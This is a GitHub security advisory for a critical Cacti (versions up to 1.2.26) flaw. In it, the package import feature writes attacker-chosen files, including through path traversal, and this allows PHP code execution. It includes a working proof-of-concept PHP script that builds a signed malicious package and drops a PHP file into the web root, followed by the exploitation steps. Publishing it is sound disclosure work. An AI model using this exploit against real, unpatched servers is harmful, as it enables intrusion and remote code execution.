# RCE vulnerability when importing packages

Critical

[netniV](/netniV)
published
GHSA-7cmj-g5qc-pj88
May 12, 2024

## Package

Cacti
(PHP)

## Affected versions

<= 1.2.26

## Patched versions

1.2.27

## Description

### Summary

An arbitrary file write vulnerability, exploitable through the "Package Import" feature, allows authenticated users having the "Import Templates" permission to execute arbitrary PHP code on the web server ([RCE](https://en.wikipedia.org/wiki/Arbitrary_code_execution)).

### Details

The vulnerability is located within the `import_package()` function defined into the **/lib/import.php** script:

[![Schermata del 2024-01-17 19-23-23](https://user-images.githubusercontent.com/57233361/297478893-6f8d716c-3094-442c-8340-1dd34034b993.png)](https://user-images.githubusercontent.com/57233361/297478893-6f8d716c-3094-442c-8340-1dd34034b993.png)

The function blindly trusts the filename and file content provided within the XML data, and writes such files into the Cacti base path (or even outside, since path traversal sequences are not filtered). This can be exploited to write or overwrite arbitrary files on the web server, leading to execution of arbitrary PHP code or other security impacts.

### PoC

* Use the following PHP script to generate a malicious package to import into Cacti:

```
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php phpinfo(); ?>";
$keypair = openssl_pkey_new();
$public_key = openssl_pkey_get_details($keypair)["key"];
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>

```

* Login into Cacti with an user having the "Import Templates" permission
* Go to **Import/Export** -> **Import Packages**
* Upload and import the `test.xml.gz` file previously generated
* Notice how the PHP file will be written into the `resource` directory, accessible at **http://[cacti]/resource/test.php**:

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
